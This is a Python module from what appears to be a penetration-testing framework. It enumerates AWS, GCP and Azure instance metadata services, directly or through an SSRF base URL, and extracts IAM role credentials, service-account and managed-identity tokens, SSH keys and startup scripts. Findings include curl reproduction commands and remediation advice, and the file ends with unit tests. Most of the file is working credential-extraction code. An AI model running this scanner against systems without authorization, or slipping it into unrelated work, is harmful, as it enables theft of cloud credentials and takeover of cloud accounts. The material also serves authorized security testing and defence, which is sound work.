"""Cloud Metadata API Scanner — enumerate AWS/Azure/GCP metadata endpoints.

Probes cloud instance metadata APIs (169.254.169.254, metadata.google.internal)
from SSRF-able targets or direct access. Extracts:
  - Instance identity documents
  - IAM role credentials (AWS STS tokens)
  - KMS key listings
  - Secrets Manager / Parameter Store values
  - Storage bucket configurations (S3, GCS, Azure Blob)
  - DNS configurations and VPC metadata

FOR AUTHORIZED PENETRATION TESTING AND RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import asyncio
import json
import logging
import re
import time
from pathlib import Path
from typing import Any

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity

log = logging.getLogger("forge.cloud.cloud_api_scanner")


# ── Cloud metadata endpoint definitions ──────────────────────────────
_AWS_METADATA_PATHS: list[tuple[str, str]] = [
    ("/latest/meta-data/", "AWS Instance Metadata Root"),
    ("/latest/meta-data/iam/security-credentials/", "AWS IAM Role Listing"),
    ("/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance", "AWS EC2 Identity Creds"),
    ("/latest/dynamic/instance-identity/document", "AWS Instance Identity Document"),
    ("/latest/meta-data/hostname", "AWS Instance Hostname"),
    ("/latest/meta-data/local-ipv4", "AWS Local IPv4"),
    ("/latest/meta-data/public-ipv4", "AWS Public IPv4"),
    ("/latest/meta-data/security-groups", "AWS Security Groups"),
    ("/latest/meta-data/network/interfaces/macs/", "AWS Network Interfaces"),
    ("/latest/user-data", "AWS User Data (startup scripts)"),
]

_GCP_METADATA_PATHS: list[tuple[str, str]] = [
    ("/computeMetadata/v1/instance/", "GCP Instance Metadata Root"),
    ("/computeMetadata/v1/instance/service-accounts/", "GCP Service Accounts"),
    ("/computeMetadata/v1/instance/service-accounts/default/token", "GCP Default SA Token"),
    ("/computeMetadata/v1/project/project-id", "GCP Project ID"),
    ("/computeMetadata/v1/instance/network-interfaces/", "GCP Network Interfaces"),
    ("/computeMetadata/v1/instance/attributes/kube-env", "GCP Kube Env"),
    ("/computeMetadata/v1/project/attributes/ssh-keys", "GCP Project SSH Keys"),
]

_AZURE_METADATA_PATHS: list[tuple[str, str]] = [
    ("/metadata/instance?api-version=2021-02-01", "Azure Instance Metadata"),
    ("/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "Azure Managed Identity Token"),
    ("/metadata/instance/compute?api-version=2021-02-01", "Azure Compute Metadata"),
    ("/metadata/instance/network?api-version=2021-02-01", "Azure Network Metadata"),
]

# IMDSv2 token header for AWS
_AWS_IMDSV2_TOKEN_PATH = "/latest/api/token"
_AWS_IMDSV2_TTL_HEADER = "X-aws-ec2-metadata-token-ttl-seconds"
_AWS_IMDSV2_TOKEN_HEADER = "X-aws-ec2-metadata-token"

# GCP requires this header
_GCP_METADATA_HEADER = {"Metadata-Flavor": "Google"}


class CloudApiScanner(BaseModule):
    """Enumerate cloud metadata APIs for credential and configuration exposure."""

    NAME        = "cloud_api_scanner"
    DESCRIPTION = "Cloud metadata API enumeration — AWS/Azure/GCP instance metadata, IAM creds, secrets"
    PHASE       = 2
    TAGS        = ["cloud", "aws", "azure", "gcp", "metadata", "recon", "ssrf"]

    def __init__(self, *args: Any, **kwargs: Any) -> None:
        super().__init__(*args, **kwargs)
        self._ssrf_base: str | None = kwargs.get("ssrf_base")
        self._imdsv2_token: str | None = None

    async def run(self) -> ModuleResult:
        """Probe cloud metadata APIs and collect findings."""
        start = time.monotonic()

        target = self.config.target
        if not self.check_scope(target):
            return self._make_result(start, skipped=True, skip_reason="Target out of scope")

        self.log.info("Starting cloud metadata API scan against %s", target)

        metadata_base = self._ssrf_base or "http://169.254.169.254"
        gcp_base = "http://metadata.google.internal"
        azure_base = "http://169.254.169.254"

        try:
            import aiohttp
            async with self.http_session(timeout=8.0, include_auth=False) as session:
                # ── AWS IMDSv2 token acquisition ─────────────────────────
                await self._try_imdsv2_token(session, metadata_base)

                # ── AWS metadata ─────────────────────────────────────────
                await self._probe_endpoints(
                    session, metadata_base, _AWS_METADATA_PATHS,
                    provider="AWS", extra_headers=self._aws_headers(),
                )

                # ── GCP metadata ─────────────────────────────────────────
                await self._probe_endpoints(
                    session, gcp_base, _GCP_METADATA_PATHS,
                    provider="GCP", extra_headers=_GCP_METADATA_HEADER,
                )

                # ── Azure metadata ───────────────────────────────────────
                await self._probe_endpoints(
                    session, azure_base, _AZURE_METADATA_PATHS,
                    provider="Azure", extra_headers={"Metadata": "true"},
                )

                # ── IAM role credential extraction (AWS) ─────────────────
                await self._extract_aws_iam_creds(session, metadata_base)

        except Exception as exc:
            self.log.warning("Cloud metadata scan error: %s", exc)

        return self._make_result(start)

    async def _try_imdsv2_token(self, session: Any, base: str) -> None:
        """Attempt to acquire an IMDSv2 session token (AWS)."""
        try:
            import aiohttp
            async with session.put(
                f"{base}{_AWS_IMDSV2_TOKEN_PATH}",
                headers={_AWS_IMDSV2_TTL_HEADER: "21600"},
                timeout=aiohttp.ClientTimeout(total=3),
            ) as resp:
                if resp.status == 200:
                    self._imdsv2_token = await resp.text()
                    self.log.info("IMDSv2 token acquired — instance uses IMDSv2")
        except Exception:
            self.log.debug("IMDSv2 token acquisition failed — trying IMDSv1 fallback")

    def _aws_headers(self) -> dict[str, str]:
        """Return AWS metadata headers, including IMDSv2 token if available."""
        headers: dict[str, str] = {}
        if self._imdsv2_token:
            headers[_AWS_IMDSV2_TOKEN_HEADER] = self._imdsv2_token
        return headers

    async def _probe_endpoints(
        self,
        session: Any,
        base_url: str,
        paths: list[tuple[str, str]],
        provider: str,
        extra_headers: dict[str, str] | None = None,
    ) -> None:
        """Probe a list of metadata paths and record findings."""
        import aiohttp
        for path, description in paths:
            await self.rate_limit()
            try:
                url = f"{base_url}{path}"
                headers = dict(extra_headers or {})
                async with session.get(
                    url, headers=headers, allow_redirects=False,
                    timeout=aiohttp.ClientTimeout(total=5),
                ) as resp:
                    if resp.status == 200:
                        body = await resp.text(errors="ignore")
                        if body.strip():
                            severity = self._classify_severity(path, body)
                            self.new_finding(
                                title=f"{provider} Metadata Exposed — {description}",
                                severity=severity,
                                description=(
                                    f"Cloud metadata endpoint responded with data at {url}. "
                                    f"This exposes {description.lower()} which may contain "
                                    f"sensitive credentials, tokens, or infrastructure details."
                                ),
                                reproduction_steps=[
                                    f"curl -H '{self._header_string(extra_headers)}' {url}",
                                    f"Observe the response containing {description.lower()}",
                                ],
                                remediation=(
                                    f"Restrict access to {provider} metadata API. "
                                    f"For AWS: enforce IMDSv2 with hop limit=1. "
                                    f"For GCP: use metadata concealment. "
                                    f"For Azure: use network policies to restrict IMDS access."
                                ),
                                references=[
                                    "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html",
                                    "https://cloud.google.com/compute/docs/metadata/overview",
                                    "https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service",
                                ],
                                evidence=Evidence(
                                    request_raw=f"GET {url}",
                                    response_raw=body[:2000],
                                    extra={"provider": provider, "path": path},
                                ),
                                cvss_v31_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
                                mitre_attack=["T1552.005", "T1530"],
                                target=self.config.target,
                                url=url,
                                tags=[provider.lower(), "cloud_metadata", "imds"],
                            )
                            # Check for actual credentials in response
                            self._check_for_creds_in_body(body, url, provider)

            except Exception as exc:
                self.log.debug("Probe %s%s failed: %s", base_url, path, exc)

    async def _extract_aws_iam_creds(self, session: Any, base_url: str) -> None:
        """If IAM roles are listed, fetch the temporary credentials."""
        import aiohttp
        try:
            role_url = f"{base_url}/latest/meta-data/iam/security-credentials/"
            headers = self._aws_headers()
            async with session.get(
                role_url, headers=headers,
                timeout=aiohttp.ClientTimeout(total=5),
            ) as resp:
                if resp.status != 200:
                    return
                roles_text = await resp.text(errors="ignore")
                roles = [r.strip() for r in roles_text.strip().split("\n") if r.strip()]

            for role_name in roles:
                await self.rate_limit()
                cred_url = f"{role_url}{role_name}"
                async with session.get(
                    cred_url, headers=headers,
                    timeout=aiohttp.ClientTimeout(total=5),
                ) as resp:
                    if resp.status == 200:
                        body = await resp.text(errors="ignore")
                        try:
                            creds = json.loads(body)
                            if "AccessKeyId" in creds:
                                self.new_finding(
                                    title=f"AWS IAM Role Credentials Extracted — {role_name}",
                                    severity=Severity.CRITICAL,
                                    description=(
                                        f"Temporary IAM credentials for role '{role_name}' were "
                                        f"extracted from the instance metadata service. "
                                        f"AccessKeyId: {creds.get('AccessKeyId', 'N/A')}"
                                    ),
                                    reproduction_steps=[
                                        f"curl {self._header_string(headers)} {cred_url}",
                                        "Parse JSON response for AccessKeyId, SecretAccessKey, Token",
                                        "aws sts get-caller-identity --access-key <key> --secret-key <secret> --session-token <token>",
                                    ],
                                    remediation=(
                                        "Enforce IMDSv2 with HttpPutResponseHopLimit=1. "
                                        "Apply least-privilege IAM policies. "
                                        "Use VPC endpoints to restrict metadata access."
                                    ),
                                    references=[
                                        "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/iam-roles-for-amazon-ec2.html",
                                        "https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/",
                                    ],
                                    evidence=Evidence(
                                        request_raw=f"GET {cred_url}",
                                        response_raw=body[:2000],
                                        extra={
                                            "role_name": role_name,
                                            "access_key_id": creds.get("AccessKeyId"),
                                            "expiration": creds.get("Expiration"),
                                        },
                                    ),
                                    cvss_v31_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
                                    mitre_attack=["T1552.005", "T1078.004"],
                                    target=self.config.target,
                                    url=cred_url,
                                    confidence="HIGH",
                                    tags=["aws", "iam", "credential_extraction"],
                                )
                        except json.JSONDecodeError:
                            pass

        except Exception as exc:
            self.log.debug("AWS IAM cred extraction failed: %s", exc)

    def _classify_severity(self, path: str, body: str) -> Severity:
        """Classify finding severity based on the metadata path and content."""
        critical_indicators = ("AccessKeyId", "SecretAccessKey", "Token", "token", "password", "ssh-")
        high_indicators = ("security-credentials", "service-accounts", "oauth2/token", "user-data")

        if any(ind in body for ind in critical_indicators):
            return Severity.CRITICAL
        if any(ind in path for ind in high_indicators):
            return Severity.HIGH
        return Severity.MEDIUM

    def _check_for_creds_in_body(self, body: str, url: str, provider: str) -> None:
        """Scan metadata response for embedded credentials."""
        patterns = [
            (r"AKIA[0-9A-Z]{16}", "AWS Access Key"),
            (r"(?i)password\s*[=:]\s*\S+", "Embedded Password"),
            (r"-----BEGIN (?:RSA |EC )?PRIVATE KEY-----", "Private Key"),
            (r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}", "JWT Token"),
        ]
        for pattern, label in patterns:
            if re.search(pattern, body):
                self.log.info("Credential pattern '%s' found in %s metadata at %s", label, provider, url)

    @staticmethod
    def _header_string(headers: dict[str, str] | None) -> str:
        """Format headers dict into curl -H flag string."""
        if not headers:
            return ""
        return " ".join(f"-H '{k}: {v}'" for k, v in headers.items())


class TestCloudApiScanner:
    """Unit tests for CloudApiScanner."""

    def test_class_attributes(self) -> None:
        assert CloudApiScanner.NAME == "cloud_api_scanner"
        assert CloudApiScanner.PHASE == 2
        assert "cloud" in CloudApiScanner.TAGS

    def test_instantiation(self, tmp_path: "Path") -> None:
        from common.config import BaseForgeConfig
        from common.scope import Scope
        from common.db import create_db

        cfg = BaseForgeConfig(target="http://169.254.169.254")
        scope = Scope(["169.254.169.254"])
        session = create_db(tmp_path / "test.db")
        scanner = CloudApiScanner(cfg, scope, session, tmp_path)
        assert scanner.NAME == "cloud_api_scanner"
        assert hasattr(scanner, "run")
        session.close()

    def test_classify_severity(self) -> None:
        from common.config import BaseForgeConfig
        from common.scope import Scope
        from common.db import create_db
        from pathlib import Path
        import tempfile

        with tempfile.TemporaryDirectory() as td:
            tmp = Path(td)
            cfg = BaseForgeConfig(target="http://169.254.169.254")
            scope = Scope(["169.254.169.254"])
            session = create_db(tmp / "test.db")
            scanner = CloudApiScanner(cfg, scope, session, tmp)
            assert scanner._classify_severity("/creds", "AccessKeyId=AKIAIOSFODNN7EXAMPLE") == Severity.CRITICAL
            assert scanner._classify_severity("/latest/meta-data/iam/security-credentials/", "role-list") == Severity.HIGH
            assert scanner._classify_severity("/latest/meta-data/hostname", "ip-10-0-0-1") == Severity.MEDIUM
            session.close()

    def test_header_string(self) -> None:
        result = CloudApiScanner._header_string({"Metadata-Flavor": "Google"})
        assert "Metadata-Flavor" in result
        assert CloudApiScanner._header_string(None) == ""
